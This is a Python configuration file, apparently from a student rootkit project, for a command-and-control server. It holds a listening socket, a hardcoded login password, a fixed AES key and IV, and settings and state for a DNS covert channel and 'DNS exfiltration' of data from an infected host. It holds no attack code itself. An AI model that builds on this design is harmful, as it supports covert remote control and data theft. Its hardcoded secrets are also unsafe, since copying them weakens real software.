import threading

# -------------------------- CONFIGURATION FIXE --------------------------- #

# Réseau principal
HOST = '0.0.0.0'
PORT = 4242
BUFFER_SIZE = 1024

# Authentification Web
PASSWORD = "epiroot"  # à comparer avec le champ HTML de login

# Dossiers pour les fichiers
UPLOAD_FOLDER = "uploads"
DOWNLOAD_FOLDER = "downloads"

# Chiffrement AES (128 bits)
AES_KEY = b'1234567890abcdef'   # 16 bytes
AES_IV  = b'abcdef1234567890'   # 16 bytes

# DNS covert channel
DNS_PORT             = 53
DNS_DOMAIN           = "dns.google.com"
DNS_RESPONSE_TIMEOUT = 12.0
DNS_POLL_INTERVAL    = 0.2

# ---------------------------- ÉTAT GLOBAL ------------------------------- #
# (à utiliser uniquement côté backend rootkit et socket)

# Connexion active avec le rootkit
rootkit_connexion = None

# DNS exfiltration dynamique
command_queue    = []
exfil_buffer     = {}
last_channel     = 'tcp'
expected_chunks  = None
